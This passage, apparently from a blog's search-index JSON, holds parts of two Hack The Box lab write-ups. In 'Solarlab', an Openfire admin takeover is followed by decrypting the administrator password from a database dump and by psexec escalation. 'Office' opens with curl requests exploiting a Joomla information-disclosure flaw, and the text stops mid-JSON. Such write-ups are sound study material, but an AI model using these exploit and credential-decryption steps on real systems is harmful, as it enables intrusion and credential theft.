default, enabled group nt authority\\batch well-known group s-1-5-3 mandatory group, enabled by default, enabled group console logon well-known group s-1-2-1 mandatory group, enabled by default, enabled group nt authority\\authenticated users well-known group s-1-5-11 mandatory group, enabled by default, enabled group nt authority\\this organization well-known group s-1-5-15 mandatory group, enabled by default, enabled group nt authority\\local account well-known group s-1-5-113 mandatory group, enabled by default, enabled group local well-known group s-1-2-0 mandatory group, enabled by default, enabled group nt authority\\ntlm authentication well-known group s-1-5-64-10 mandatory group, enabled by default, enabled group mandatory label\\medium mandatory level label s-1-16-8192 privileges information ---------------------- privilege name description state ============================= ==================================== ======== seshutdownprivilege shut down the system disabled sechangenotifyprivilege bypass traverse checking enabled seundockprivilege remove computer from docking station disabled seincreaseworkingsetprivilege increase a process working set disabled setimezoneprivilege change the time zone disable active connections - listening\ntcp 0.0.0.0:80 0.0.0.0:0 listening 4960 tcp 0.0.0.0:135 0.0.0.0:0 listening 896 tcp 0.0.0.0:445 0.0.0.0:0 listening 4 tcp 0.0.0.0:5040 0.0.0.0:0 listening 6008 tcp 0.0.0.0:5985 0.0.0.0:0 listening 4 tcp 0.0.0.0:6791 0.0.0.0:0 listening 4960 tcp 0.0.0.0:47001 0.0.0.0:0 listening 4 tcp 0.0.0.0:49664 0.0.0.0:0 listening 660 tcp 0.0.0.0:49665 0.0.0.0:0 listening 528 tcp 0.0.0.0:49666 0.0.0.0:0 listening 728 tcp 0.0.0.0:49667 0.0.0.0:0 listening 1564 tcp 0.0.0.0:49668 0.0.0.0:0 listening 652 tcp 10.10.11.16:139 0.0.0.0:0 listening 4 tcp 127.0.0.1:5000 0.0.0.0:0 listening 852 tcp 127.0.0.1:5222 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5223 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5262 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5263 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5269 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5270 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5275 0.0.0.0:0 listening 2996 tcp 127.0.0.1:5276 0.0.0.0:0 listening 2996 tcp 127.0.0.1:7070 0.0.0.0:0 listening 2996 tcp 127.0.0.1:7443 0.0.0.0:0 listening 2996 tcp 127.0.0.1:9090 0.0.0.0:0 listening 2996 tcp 127.0.0.1:9091 0.0.0.0:0 listening 2996 tcp [::]:135 [::]:0 listening 896 tcp [::]:445 [::]:0 listening 4 tcp [::]:5985 [::]:0 listening 4 tcp [::]:47001 [::]:0 listening 4 tcp [::]:49664 [::]:0 listening 660 tcp [::]:49665 [::]:0 listening 528 tcp [::]:49666 [::]:0 listening 728 tcp [::]:49667 [::]:0 listening 1564 tcp [::]:49668 [::]:0 listening 652 running services on local interface\nget-process -id 2996 handles npm(k) pm(k) ws(k) cpu(s) id si processname ------- ------ ----- ----- ------ -- -- ----------- 967 87 318252 212752 2996 0 openfire-service users on the local machine\nuser accounts for \\\\solarlab ------------------------------------------------------------------------------- administrator blake defaultaccount guest openfire wdagutilityaccount openfire 4.7.4\nopenfire is running on port 9090 let\u0026rsquo;s use chisel to forward the port.\nopenfire version was 4.7.4 vulnerable to admin account takeover. poc\nafter successful exploitation got a shell as openfire. testing credentials using the users.db i found a match.\nopenfire:******** found a script inside embedded-db folder.\nopenfire.properties\nset database unique name hsqldb8bdd3b2742 set database gc 0 set database default result memory rows 0 set database event log level 0 set database transaction control locks set database default isolation level read committed set database transaction rollback on conflict true set database text table defaults \u0026#39;\u0026#39; set database sql names false set database sql references false set database sql size true set database sql types false set database sql tdc delete true set database sql tdc update true set database sql concat nulls true set database sql unique nulls true set database sql convert truncate true set database sql avg scale 0 set database sql double nan true set files write delay 1 set files backup increment true set files cache size 10000 set files cache rows 50000 set files scale 32 set files lob scale 32 set files defrag 0 set files nio true set files nio size 256 set files log true set files log size 20 create user sa password digest \u0026#39;d41d8cd98f00b204e9800998ecf8427e\u0026#39; alter user sa set local true create schema public authorization dba set schema public create memory table public.ofuser(username varchar(64) not null,storedkey varchar(32),serverkey varchar(32),salt varchar(32),iterations integer,plainpassword varchar(32),encryptedpassword varchar(255),name varchar(100),email varchar(100),creationdate varchar(15) not null,modificationdate varchar(15) not null,constraint ofuser_pk primary key(username)) create index ofuser_cdate_idx on public.ofuser(creationdate) create memory table public.ofuserprop(username varchar(64) not null,name varchar(100) not null,propvalue varchar(4000) not null,constraint ofuserprop_pk primary key(username,name)) create memory table public.ofuserflag(username varchar(64) not null,name varchar(100) not null,starttime varchar(15),endtime varchar(15),constraint ofuserflag_pk primary key(username,name)) create index ofuserflag_stime_idx on public.ofuserflag(starttime) create index ofuserflag_etime_idx on public.ofuserflag(endtime) create memory table public.ofoffline(username varchar(64) not null,messageid bigint not null,creationdate varchar(15) not null,messagesize integer not null,stanza varchar(16777216) not null,constraint ofoffline_pk primary key(username,messageid)) create memory table public.ofpresence(username varchar(64) not null,offlinepresence varchar(16777216),offlinedate varchar(15) not null,constraint ofpresence_pk primary key(username)) create memory table public.ofroster(rosterid bigint not null,username varchar(64) not null,jid varchar(1024) not null,sub integer not null,ask integer not null,recv integer not null,nick varchar(255),stanza varchar(16777216),constraint ofroster_pk primary key(rosterid)) create index ofroster_username_idx on public.ofroster(username) create index ofroster_jid_idx on public.ofroster(jid) create memory table public.ofrostergroups(rosterid bigint not null,rank integer not null,groupname varchar(255) not null,constraint ofrostergroups_pk primary key(rosterid,rank)) create index ofrostergroup_rosterid_idx on public.ofrostergroups(rosterid) create memory table public.ofvcard(username varchar(64) not null,vcard varchar(16777216) not null,constraint ofvcard_pk primary key(username)) create memory table public.ofgroup(groupname varchar(50) not null,description varchar(255),constraint ofgroup_pk primary key(groupname)) create memory table public.ofgroupprop(groupname varchar(50) not null,name varchar(100) not null,propvalue varchar(4000) not null,constraint ofgroupprop_pk primary key(groupname,name)) create memory table public.ofgroupuser(groupname varchar(50) not null,username varchar(100) not null,administrator integer not null,constraint ofgroupuser_pk primary key(groupname,username,administrator)) create memory table public.ofid(idtype integer not null,id bigint not null,constraint ofid_pk primary key(idtype)) create memory table public.ofproperty(name varchar(100) not null,propvalue varchar(4000) not null,encrypted integer,iv character(24),constraint ofproperty_pk primary key(name)) create memory table public.ofversion(name varchar(50) not null,version integer not null,constraint ofversion_pk primary key(name)) create memory table public.ofextcomponentconf(subdomain varchar(255) not null,wildcard integer not null,secret varchar(255),permission varchar(10) not null,constraint ofextcomponentconf_pk primary key(subdomain)) create memory table public.ofremoteserverconf(xmppdomain varchar(255) not null,remoteport integer,permission varchar(10) not null,constraint ofremoteserverconf_pk primary key(xmppdomain)) create memory table public.ofprivacylist(username varchar(64) not null,name varchar(100) not null,isdefault integer not null,list varchar(16777216) not null,constraint ofprivacylist_pk primary key(username,name)) create index ofprivacylist_default_idx on public.ofprivacylist(username,isdefault) create memory table public.ofsaslauthorized(username varchar(64) not null,principal varchar(4000) not null,constraint ofsaslauthorized_pk primary key(username,principal)) create memory table public.ofsecurityauditlog(msgid bigint not null,username varchar(64) not null,entrystamp bigint not null,summary varchar(255) not null,node varchar(255) not null,details varchar(16777216),constraint ofsecurityauditlog_pk primary key(msgid)) create index ofsecurityauditlog_tstamp_idx on public.ofsecurityauditlog(entrystamp) create index ofsecurityauditlog_uname_idx on public.ofsecurityauditlog(username) create memory table public.ofmucservice(serviceid bigint not null,subdomain varchar(255) not null,description varchar(255),ishidden integer not null,constraint ofmucservice_pk primary key(subdomain)) create index ofmucservice_serviceid_idx on public.ofmucservice(serviceid) create memory table public.ofmucserviceprop(serviceid bigint not null,name varchar(100) not null,propvalue varchar(4000) not null,constraint ofmucserviceprop_pk primary key(serviceid,name)) create memory table public.ofmucroom(serviceid bigint not null,roomid bigint not null,creationdate character(15) not null,modificationdate character(15) not null,name varchar(50) not null,naturalname varchar(255) not null,description varchar(255),lockeddate character(15) not null,emptydate character(15),canchangesubject integer not null,maxusers integer not null,publicroom integer not null,moderated integer not null,membersonly integer not null,caninvite integer not null,roompassword varchar(50),candiscoverjid integer not null,logenabled integer not null,subject varchar(100),rolestobroadcast integer not null,usereservednick integer not null,canchangenick integer not null,canregister integer not null,allowpm integer,fmucenabled integer,fmucoutboundnode varchar(255),fmucoutboundmode integer,fmucinboundnodes varchar(4000),constraint ofmucroom_pk primary key(serviceid,name)) create index ofmucroom_roomid_idx on public.ofmucroom(roomid) create index ofmucroom_serviceid_idx on public.ofmucroom(serviceid) create memory table public.ofmucroomprop(roomid bigint not null,name varchar(100) not null,propvalue varchar(4000) not null,constraint ofmucroomprop_pk primary key(roomid,name)) create memory table public.ofmucaffiliation(roomid bigint not null,jid varchar(1024) not null,affiliation integer not null,constraint ofmucaffiliation_pk primary key(roomid,jid)) create memory table public.ofmucmember(roomid bigint not null,jid varchar(1024) not null,nickname varchar(255),firstname varchar(100),lastname varchar(100),url varchar(100),email varchar(100),faqentry varchar(100),constraint ofmucmember_pk primary key(roomid,jid)) create memory table public.ofmucconversationlog(roomid bigint not null,messageid bigint not null,sender varchar(1024) not null,nickname varchar(255),logtime character(15) not null,subject varchar(255),body varchar(16777216),stanza varchar(16777216)) create index ofmucconversationlog_roomtime_idx on public.ofmucconversationlog(roomid,logtime) create index ofmucconversationlog_time_idx on public.ofmucconversationlog(logtime) create index ofmucconversationlog_msg_id on public.ofmucconversationlog(messageid) create memory table public.ofpubsubnode(serviceid varchar(100) not null,nodeid varchar(100) not null,leaf integer not null,creationdate character(15) not null,modificationdate character(15) not null,parent varchar(100),deliverpayloads integer not null,maxpayloadsize integer,persistitems integer,maxitems integer,notifyconfigchanges integer not null,notifydelete integer not null,notifyretract integer not null,presencebased integer not null,senditemsubscribe integer not null,publishermodel varchar(15) not null,subscriptionenabled integer not null,configsubscription integer not null,accessmodel varchar(10) not null,payloadtype varchar(100),bodyxslt varchar(100),dataformxslt varchar(100),creator varchar(1024) not null,description varchar(255),language varchar(255),name varchar(50),replypolicy varchar(15),associationpolicy varchar(15),maxleafnodes integer,constraint ofpubsubnode_pk primary key(serviceid,nodeid)) create memory table public.ofpubsubnodejids(serviceid varchar(100) not null,nodeid varchar(100) not null,jid varchar(1024) not null,associationtype varchar(20) not null,constraint ofpubsubnodejids_pk primary key(serviceid,nodeid,jid)) create memory table public.ofpubsubnodegroups(serviceid varchar(100) not null,nodeid varchar(100) not null,rostergroup varchar(100) not null) create index ofpubsubnodegroups_idx on public.ofpubsubnodegroups(serviceid,nodeid) create memory table public.ofpubsubaffiliation(serviceid varchar(100) not null,nodeid varchar(100) not null,jid varchar(1024) not null,affiliation varchar(10) not null,constraint ofpubsubaffiliation_pk primary key(serviceid,nodeid,jid)) create memory table public.ofpubsubitem(serviceid varchar(100) not null,nodeid varchar(100) not null,id varchar(100) not null,jid varchar(1024) not null,creationdate character(15) not null,payload clob(1g),constraint ofpubsubitem_pk primary key(serviceid,nodeid,id)) create memory table public.ofpubsubsubscription(serviceid varchar(100) not null,nodeid varchar(100) not null,id varchar(100) not null,jid varchar(1024) not null,owner varchar(1024) not null,state varchar(15) not null,deliver integer not null,digest integer not null,digest_frequency integer not null,expire character(15),includebody integer not null,showvalues varchar(30) not null,subscriptiontype varchar(10) not null,subscriptiondepth integer not null,keyword varchar(200),constraint ofpubsubsubscription_pk primary key(serviceid,nodeid,id)) create memory table public.ofpubsubdefaultconf(serviceid varchar(100) not null,leaf integer not null,deliverpayloads integer not null,maxpayloadsize integer not null,persistitems integer not null,maxitems integer not null,notifyconfigchanges integer not null,notifydelete integer not null,notifyretract integer not null,presencebased integer not null,senditemsubscribe integer not null,publishermodel varchar(15) not null,subscriptionenabled integer not null,accessmodel varchar(10) not null,language varchar(255),replypolicy varchar(15),associationpolicy varchar(15) not null,maxleafnodes integer not null,constraint ofpubsubdefaultconf_pk primary key(serviceid,leaf)) alter sequence system_lobs.lob_id restart with 1 set database default initial schema public grant usage on domain information_schema.sql_identifier to public grant usage on domain information_schema.yes_or_no to public grant usage on domain information_schema.time_stamp to public grant usage on domain information_schema.cardinal_number to public grant usage on domain information_schema.character_data to public grant dba to sa set schema system_lobs insert into blocks values(0,2147483647,0) set schema public insert into ofuser values(\u0026#39;admin\u0026#39;,\u0026#39;gjmoswpk+hakpdvlivp6elklyh0=\u0026#39;,\u0026#39;9mwnqcj9bf4yeyzddns5gvxp620=\u0026#39;,\u0026#39;yidqk5skw11qjwtbaloab28lyhftqa0x\u0026#39;,4096,null,\u0026#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442\u0026#39;,\u0026#39;administrator\u0026#39;,\u0026#39;admin@solarlab.htb\u0026#39;,\u0026#39;001700223740785\u0026#39;,\u0026#39;0\u0026#39;) insert into ofuserprop values(\u0026#39;admin\u0026#39;,\u0026#39;console.rows_per_page\u0026#39;,\u0026#39;/session-summary.jsp=25\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,1,\u0026#39;001700223778861\u0026#39;,127,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: openfire 4.7.5\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,2,\u0026#39;001700223779069\u0026#39;,125,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: search 1.7.4\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,6,\u0026#39;001714131992714\u0026#39;,127,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: openfire 4.8.1\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,7,\u0026#39;001714131993136\u0026#39;,125,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: search 1.7.4\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,11,\u0026#39;001715023572659\u0026#39;,127,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: openfire 4.8.1\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofoffline values(\u0026#39;admin\u0026#39;,12,\u0026#39;001715023572956\u0026#39;,125,\u0026#39;\u0026lt;message from=\u0026#34;solarlab.htb\u0026#34; to=\u0026#34;admin@solarlab.htb\u0026#34;\u0026gt;\u0026lt;body\u0026gt;a server or plugin update was found: search 1.7.4\u0026lt;/body\u0026gt;\u0026lt;/message\u0026gt;\u0026#39;) insert into ofid values(18,1) insert into ofid values(19,16) insert into ofid values(23,1) insert into ofid values(25,3) insert into ofid values(26,2) insert into ofid values(27,1) insert into ofproperty values(\u0026#39;cache.mucservice\u0026#39;\u0026#39;conference\u0026#39;\u0026#39;roomstatistics.maxlifetime\u0026#39;,\u0026#39;-1\u0026#39;,0,null) insert into ofproperty values(\u0026#39;cache.mucservice\u0026#39;\u0026#39;conference\u0026#39;\u0026#39;roomstatistics.size\u0026#39;,\u0026#39;-1\u0026#39;,0,null) insert into ofproperty values(\u0026#39;cache.mucservice\u0026#39;\u0026#39;conference\u0026#39;\u0026#39;rooms.maxlifetime\u0026#39;,\u0026#39;-1\u0026#39;,0,null) insert into ofproperty values(\u0026#39;cache.mucservice\u0026#39;\u0026#39;conference\u0026#39;\u0026#39;rooms.size\u0026#39;,\u0026#39;-1\u0026#39;,0,null) insert into ofproperty values(\u0026#39;passwordkey\u0026#39;,\u0026#39;hgxifzskaaeyljn\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.admin.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.admin.defaultadminprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.auth.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.auth.defaultauthprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.group.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.group.defaultgroupprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.lockout.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.lockout.defaultlockoutprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.securityaudit.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.security.defaultsecurityauditprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.user.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.user.defaultuserprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;provider.vcard.classname\u0026#39;,\u0026#39;org.jivesoftware.openfire.vcard.defaultvcardprovider\u0026#39;,0,null) insert into ofproperty values(\u0026#39;update.lastcheck\u0026#39;,\u0026#39;1715023572956\u0026#39;,0,null) insert into ofproperty values(\u0026#39;xmpp.auth.anonymous\u0026#39;,\u0026#39;false\u0026#39;,0,null) insert into ofproperty values(\u0026#39;xmpp.domain\u0026#39;,\u0026#39;solarlab.htb\u0026#39;,0,null) insert into ofproperty values(\u0026#39;xmpp.proxy.enabled\u0026#39;,\u0026#39;false\u0026#39;,0,null) insert into ofproperty values(\u0026#39;xmpp.socket.ssl.active\u0026#39;,\u0026#39;true\u0026#39;,0,null) insert into ofversion values(\u0026#39;openfire\u0026#39;,34) insert into ofsecurityauditlog values(1,\u0026#39;admin\u0026#39;,1700223751042,\u0026#39;successful admin console login attempt\u0026#39;,\u0026#39;solarlab.htb\u0026#39;,\u0026#39;the user logged in successfully to the admin console from address 127.0.0.1. \u0026#39;) insert into ofsecurityauditlog values(2,\u0026#39;admin\u0026#39;,1700223756534,\u0026#39;edited file transfer proxy settings\u0026#39;,\u0026#39;solarlab.htb\u0026#39;,\u0026#39;port = 7777\\u000ahardcodedaddress = null\\u000aenabled = false\u0026#39;) insert into ofmucservice values(1,\u0026#39;conference\u0026#39;,null,0) insert into ofpubsubnode values(\u0026#39;pubsub\u0026#39;,\u0026#39;\u0026#39;,0,\u0026#39;001700223743445\u0026#39;,\u0026#39;001700223743445\u0026#39;,null,0,0,0,0,1,1,1,0,0,\u0026#39;publishers\u0026#39;,1,0,\u0026#39;open\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;solarlab.htb\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;english\u0026#39;,\u0026#39;\u0026#39;,null,\u0026#39;all\u0026#39;,-1) insert into ofpubsubaffiliation values(\u0026#39;pubsub\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;solarlab.htb\u0026#39;,\u0026#39;owner\u0026#39;) insert into ofpubsubdefaultconf values(\u0026#39;pubsub\u0026#39;,0,0,0,0,0,1,1,1,0,0,\u0026#39;publishers\u0026#39;,1,\u0026#39;open\u0026#39;,\u0026#39;english\u0026#39;,null,\u0026#39;all\u0026#39;,-1) insert into ofpubsubdefaultconf values(\u0026#39;pubsub\u0026#39;,1,1,10485760,0,1,1,1,1,0,1,\u0026#39;publishers\u0026#39;,1,\u0026#39;open\u0026#39;,\u0026#39;english\u0026#39;,null,\u0026#39;all\u0026#39;,-1) the important parts are:\ninsert into ofuser values(\u0026#39;admin\u0026#39;,\u0026#39;gjmoswpk+hakpdvlivp6elklyh0=\u0026#39;,\u0026#39;9mwnqcj9bf4yeyzddns5gvxp620=\u0026#39;,\u0026#39;yidqk5skw11qjwtbaloab28lyhftqa0x\u0026#39;,4096,null,\u0026#39;becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442\u0026#39;,\u0026#39;administrator\u0026#39;,\u0026#39;admin@solarlab.htb\u0026#39;,\u0026#39;001700223740785\u0026#39;,\u0026#39;0\u0026#39;) insert into ofproperty values(\u0026#39;passwordkey\u0026#39;,\u0026#39;hgxifzskaaeyljn\u0026#39;,0,null) after a lot of struggle found a github repo that can decrypt the password hash if we have the passwordkey.\n$ java openfiredecryptpass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hgxifzskaaeyljn picked up _java_options: -dawt.usesystemaafontsettings=on -dswing.aatext=true *************** (hex: 005400680069007300500061007300730077006f0072006400530068006f0075006c00640044006f00210040) administrator credential\nadministrator:************** using psexec by impacket i was able get a shell as administrator. ** psexec needs a writable share to upload a malicious binary to create a service using the service manager. it then uses this binary for the service\u0026rsquo;s binpath and start the server. so, to get a shell using psexec we need following conditions:\na writeable share to upload a malicious binary proper privilege token assigned to add, start, stop and remove a service. summary i struggled to find a foothold on the box because i didn\u0026rsquo;t test all the parameters to send the exploit. also, after gaining openfire user\u0026rsquo;s shell i also found it difficult to recover the administrator password because i lacked the knowledge of openfire password decryption tool. overall, my recon was good.\n","title":"HTB Machine Solarlab"},{"date":"2024-05-16","image":"","imageAlt":"","link":"http://localhost:1313/posts/htb-machines/office/","summary":"Office - HTB Recon Nmap Port State Service Version 53/tcp open domain Simple DNS Plus 80/tcp open http httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28) 88/tcp open kerberos-sec Microsoft Windows Kerberos 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP 443/tcp open ssl/http Apache httpd 2.","tags":["chisel","ctf","CVE-2023-2255","dpapi","htb","kerberos","libreoffice","mimikatz","office","windows"],"text":"office - htb recon nmap port state service version 53/tcp open domain simple dns plus 80/tcp open http httpd 2.4.56 ((win64) openssl/1.1.1t php/8.0.28) 88/tcp open kerberos-sec microsoft windows kerberos 139/tcp open netbios-ssn microsoft windows netbios-ssn 389/tcp open ldap microsoft windows active directory ldap 443/tcp open ssl/http apache httpd 2.4.56 (openssl/1.1.1t php/8.0.28) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http microsoft windows rpc over http 1.0 636/tcp open ssl/ldap microsoft windows active directory ldap 3268/tcp open ldap microsoft windows active directory ldap 3269/tcp open ssl/ldap microsoft windows active directory ldap host script results:\n| smb2-security-mode: | 3:1:1: |_ message signing enabled and required | p2p-conficker: | checking for conficker.c or higher... | check 1 (port 15731/tcp): clean (timeout) | check 2 (port 48612/tcp): clean (timeout) | check 3 (port 52719/udp): clean (timeout) | check 4 (port 54522/udp): clean (timeout) |_ 0/4 checks are positive: host is clean or ports are blocked |_clock-skew: 7h55m29s | smb2-time: | date: 2024-04-28t22:53:10 |_ start_date: n/a i think it will be better if we fix our clock-skew that is almost 8 hours. to do that let\u0026rsquo;s run the following command.\n$ sudo ntpdate -u 10.10.11.3 enumeration http enumeration joomla cms 4.2 - cve-2023-23752\n$ curl http://office.htb/readme.txt joomla! cms 1- overview * this is a joomla! 4.x installation/upgrade package. * joomla! official site: https://www.joomla.org * joomla! 4.2 version history - https://docs.joomla.org/special:mylanguage/joomla_4.2_version_history * detailed changes in the changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev this version is vulnerable to unauthenticated information disclosure (cve-2023-23752) due to improper access check. so we can access some restricted endpoints.\nusers\n$ curl http://office.htb/api/index.php/v1/users?public=true {\u0026#34;links\u0026#34;:{\u0026#34;self\u0026#34;:\u0026#34;http:\\/\\/office.htb\\/api\\/index.php\\/v1\\/users?public=true\u0026#34;},\u0026#34;data\u0026#34;:[{\u0026#34;type\u0026#34;:\u0026#34;users\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;474\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;id\u0026#34;:474,\u0026#34;name\u0026#34;:\u0026#34;tony stark\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;administrator\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;administrator@holography.htb\u0026#34;,\u0026#34;block\u0026#34;:0,\u0026#34;sendemail\u0026#34;:1,\u0026#34;registerdate\u0026#34;:\u0026#34;2023-04-13 23:27:32\u0026#34;,\u0026#34;lastvisitdate\u0026#34;:\u0026#34;2024-04-26 19:43:46\u0026#34;,\u0026#34;lastresettime\u0026#34;:null,\u0026#34;resetcount\u0026#34;:0,\u0026#34;group_count\u0026#34;:1,\u0026#34;group_names\u0026#34;:\u0026#34;super users\u0026#34;}}],\u0026#34;meta\u0026#34;:{\u0026#34;total-pages\u0026#34;:1}} application config\n$ curl http://office.htb/api/index.php/v1/config/application?public=true {\u0026#34;links\u0026#34;:{\u0026#34;self\u0026#34;:\u0026#34;http:\\/\\/office.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026#34;,\u0026#34;next\u0026#34;:\u0026#34;http:\\/\\/office.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026amp;page%5boffset%5d=20\u0026amp;page%5blimit%5d=20\u0026#34;,\u0026#34;last\u0026#34;:\u0026#34;http:\\/\\/office.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026amp;page%5boffset%5d=60\u0026amp;page%5blimit%5d=20\u0026#34;},\u0026#34;data\u0026#34;:[{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;offline\u0026#34;:false,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;offline_message\u0026#34;:\u0026#34;this site is down for maintenance.\u0026lt;br\u0026gt;please check back again soon.\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;display_offline_message\u0026#34;:1,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;offline_image\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;sitename\u0026#34;:\u0026#34;holography industries\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;editor\u0026#34;:\u0026#34;tinymce\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;captcha\u0026#34;:\u0026#34;0\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;list_limit\u0026#34;:20,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;access\u0026#34;:1,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;debug\u0026#34;:false,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;debug_lang\u0026#34;:false,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;debug_lang_const\u0026#34;:true,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;dbtype\u0026#34;:\u0026#34;mysqli\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;host\u0026#34;:\u0026#34;localhost\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;user\u0026#34;:\u0026#34;root\u0026#34;,\u0026#34;id\u0026#34;:224}},{\u0026#34;type\u0026#34;:\u0026#34;application\u0026#34;,\u0026#34;id\u0026#34;:\u0026#34;224\u0026#34;,\u0026#34;attributes\u0026#34;:{\u0026#34;p